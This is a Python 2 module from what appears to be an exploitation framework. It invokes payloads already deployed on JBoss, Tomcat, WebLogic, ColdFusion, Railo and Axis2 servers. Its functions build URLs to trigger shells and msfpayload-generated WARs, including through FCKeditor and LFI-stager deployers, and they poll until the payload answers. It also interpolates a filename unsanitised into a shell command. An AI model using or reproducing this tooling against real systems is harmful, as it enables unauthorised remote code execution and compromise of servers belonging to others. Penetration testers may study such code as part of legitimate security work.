from src.module.deploy_utils import parse_war_path
from time import sleep
from commands import getoutput
from log import LOG
import utility


def invoke(fingerengine, fingerprint, deployer):
    """
    """

    if fingerengine.service in ["jboss", "tomcat", "weblogic"]:
        return invoke_war(fingerengine, fingerprint)

    elif fingerengine.service in ["coldfusion"]:
        return invoke_cf(fingerengine, fingerprint, deployer)
    
    elif fingerengine.service in ['railo']:
        return invoke_rl(fingerengine, fingerprint, deployer)

    elif fingerengine.service in ['axis2']:
        return invoke_axis2(fingerengine, fingerprint, deployer)

    else:
        utility.Msg("Platform %s does not support --invoke" % 
                            fingerengine.options.remote_service, LOG.ERROR)

def invoke_war(fingerengine, fingerprint):
    """  Invoke a deployed WAR or JSP file on the remote server.

    This uses unzip because Python's zip module isn't very portable or
    fault tolerant; i.e. it fails to parse msfpayload-generated WARs, though
    this is a fault of metasploit, not the Python module.
    """

    dfile = fingerengine.options.deploy
    jsp = ''

    if '.war' in dfile:
        jsp = getoutput("unzip -l %s | grep jsp" % dfile).split(' ')[-1]
    elif '.jsp' in dfile:
        jsp = dfile

    if jsp == '':
        utility.Msg("Failed to find a JSP in the deployed WAR", LOG.DEBUG)
        return

    utility.Msg("Using JSP {0} from {1} to invoke".format(jsp, dfile), LOG.DEBUG)

    war_path = parse_war_path(dfile)
    try:
        # for jboss ejb/jmx invokers, we append a random integer 
        # in case multiple deploys of the same name are used
        if fingerengine.random_int:
            war_path += fingerengine.random_int
    except:
        pass

    url = "http://{0}:{1}/{2}/{3}"
    if 'random_int' in dir(fingerengine):
        # we've deployed via ejb/jmxinvokerservlet, so the path
        # will be based upon a random number
        url = url.format(fingerengine.options.ip,
                         fingerprint.port,
                         war_path + str(fingerengine.random_int),
                         jsp)
    else:
        url = url.format(fingerengine.options.ip,
                         fingerprint.port,
                         war_path,
                         jsp)

    if _invoke(url): 
        utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
    else:
        utility.Msg("Failed to invoke {0}".format(parse_war_path(dfile, True)),
                                                  LOG.ERROR)


def invoke_cf(fingerengine, fingerprint, deployer):
    """
    """

    dfile = parse_war_path(fingerengine.options.deploy, True)

    if fingerprint.version in ["10.0"]:
        # deployments to 10 require us to trigger a 404
        url = "http://{0}:{1}/CFIDE/ad123.cfm".format(fingerengine.options.ip,
                                                      fingerprint.port)
    elif fingerprint.version in ["8.0"] and "fck_editor" in deployer.__name__:
        # invoke a shell via FCKeditor deployer
        url = "http://{0}:{1}/userfiles/file/{2}".format(fingerengine.options.ip,
                                                         fingerprint.port,
                                                         dfile)
    elif 'lfi_stager' in deployer.__name__:
        url = 'http://{0}:{1}/{2}'.format(fingerengine.options.ip, 
                                          fingerprint.port,
                                          dfile)
    else:
        url = "http://{0}:{1}/CFIDE/{2}".format(fingerengine.options.ip,
                                               fingerprint.port,
                                               dfile)

    if _invoke(url):
        utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
    else:
        utility.Msg("Failed to invoke {0}".format(dfile), LOG.ERROR)


def invoke_rl(fingerengine, fingerprint, deployer):
    """
    """

    dfile = parse_war_path(fingerengine.options.deploy, True)
    url = 'http://{0}:{1}/{2}'.format(fingerengine.options.ip, fingerprint.port,
                                      dfile)

    if _invoke(url):
        utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
    else:
        utility.Msg("Failed to invoke {0}".format(dfile), LOG.ERROR)
    

def invoke_axis2(fingerengine, fingerprint, deployer):
    """ Invoke an Axis2 payload
    """

    cnt = 0
    dfile = parse_war_path(fingerengine.options.deploy)
    url = 'http://{0}:{1}/axis2/services/{2}'.format(
                fingerengine.options.ip, fingerprint.port,
                dfile)

    if fingerprint.version not in ['1.6']:
        # versions < 1.6 require an explicit invocation of run
        url += '/run'

    utility.Msg("Attempting to invoke...")

    # axis2 takes a few seconds to get going, probe for 5s
    while cnt < 5:

        if _invoke(url):
            utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
            return

        cnt += 1
        sleep(1)

    utility.Msg("Failed to invoke {0}".format(dfile), LOG.ERROR)


def _invoke(url):
    """ Make the request
    """

    status = False
    try:
        response = utility.requests_get(url)
        if response.status_code in [200, 202]:
            status = True
    except Exception, e:
        utility.Msg("Failed to invoke payload: %s" % e, LOG.ERROR)
        status = False

    return status
